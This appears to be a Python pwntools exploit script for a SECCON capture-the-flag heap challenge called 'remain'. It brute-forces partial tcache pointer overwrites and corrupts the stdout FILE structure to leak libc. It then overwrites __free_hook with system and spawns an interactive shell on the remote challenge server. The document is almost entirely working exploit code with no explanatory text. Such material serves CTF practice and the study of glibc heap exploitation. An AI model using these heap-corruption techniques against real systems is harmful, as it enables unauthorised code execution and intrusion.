from pwn import *

TARGET = './remain'
HOST = 'remain.chal.seccon.jp'
PORT = 27384

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6 ./ld.so"})

elf = ELF(TARGET)


def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def add(text):
    r.sendline('1')
    r.sendafter('> ', text)
    return r.recvuntil('> ')

def edit(idx, text):
    r.sendline('2')
    r.sendlineafter('> ', str(idx))
    r.sendafter('> ', text)
    r.recvuntil('> ')

def delete(idx):
    r.sendline('3')
    r.sendlineafter('> ', str(idx))
    r.recvuntil('> ')

# payload = p64(0)*5+p64(0x421)+p64(0)+'\x70\x00'
# payload = p64(0)*2+p64(0x0001000000000000)+p64(0x421)
payload = p64(0)+p64(0x421)+'Z'*8
flag = 0
while(1):
    r = remote(HOST, PORT)
    # r = process(TARGET)
    r.recvuntil('> ')
    add('A' * 0x47)
    add('A' * 0x47)
    delete(0)
    delete(1)
    edit(1, '\xa8\x00') # 1/16 
    add('B' * 0x47)
    try:
        add('A')
    except:
        r.close()
        continue

    delete(0)
    delete(1)
    edit(3, '\x90\x00') 
    add('D'*8+p64(0x421))

    delete(0)
    delete(1)
    edit(3, '\xa0\x04') 
    add(p64(0x21)*8)

    #gdb.attach(r, '''
    #c
    #''')
    # pause()
    delete(0)
    delete(1)
    edit(3, '\xa0\x00') 
    add('A')
    delete(6) # free  0x420

    # context.log_level = 'debug'
    edit(3, '\xa0\x16') # 1/16
    #pause()
    payload = ''
    payload += p64(0xfbad1800)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += '\x00'
    try:
        test = add(payload)
        if test[:8] == p64(0): 
            break
        else: 
            r.close()
            continue
    except:
        r.close()
        continue

context.log_level = 'debug'
gdb.attach(r, '''
c
''')

leak = u64(test[8:16])
base = leak -0x3b5980
dbg("leak")
dbg("base")
fh = base + 0x3b7e40
system = base + 0x43240

edit(3, '\x00'*4) # eliminate fbad
delete(1)
edit(3, p64(fh).rstrip('\x00')) 
add(p64(system))

edit(4, "/bin/sh\x00") 

r.sendline('3')
r.sendlineafter('> ', '4')

r.interactive()
r.close()
